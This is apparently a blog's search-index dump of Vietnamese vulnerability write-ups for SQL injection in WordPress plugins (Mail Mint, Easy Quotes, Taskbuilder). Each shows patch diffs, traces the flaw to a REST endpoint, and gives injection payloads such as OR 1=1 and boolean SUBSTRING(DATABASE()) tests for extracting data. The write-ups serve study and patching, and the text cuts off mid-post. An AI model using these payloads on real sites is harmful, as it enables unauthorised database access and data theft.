kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu 